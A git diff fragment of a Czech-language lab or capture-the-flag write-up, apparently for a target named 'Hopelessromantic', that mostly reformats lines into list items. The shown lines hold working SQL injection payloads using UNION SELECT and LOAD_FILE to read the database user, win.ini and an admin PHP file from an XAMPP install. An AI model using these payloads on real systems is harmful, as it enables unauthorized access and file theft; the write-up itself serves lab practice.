@@ -106,15 +106,14 @@ Hopelessromantic
 ```
 
 ### Test SQL injection ve vyhledávání uživatelů
-`1' UNION SELECT 1,user(),3-- -`
-`1' UNION SELECT 1,LOAD_FILE('C:\\Windows\\win.ini'),3-- -`
+- `1' UNION SELECT 1,user(),3-- -`
+- `1' UNION SELECT 1,LOAD_FILE('C:\\Windows\\win.ini'),3-- -`
 
 ### Načtení obsahu backdoorchecker.php z výchozí složky Xampp
-`1' UNION SELECT 1,LOAD_FILE('C:\\xampp\\htdocs\\admin\\backdoorchecker.php'),3-- -`
-```
+- `1' UNION SELECT 1,LOAD_FILE('C:\\xampp\\htdocs\\admin\\backdoorchecker.php'),3-- -`
 Obsah se lépe čte pomocí Developer tools prohlížeče na záložce Network
 ```
-?php
+<?php
 include('../link.php');
 include('auth.php');
 
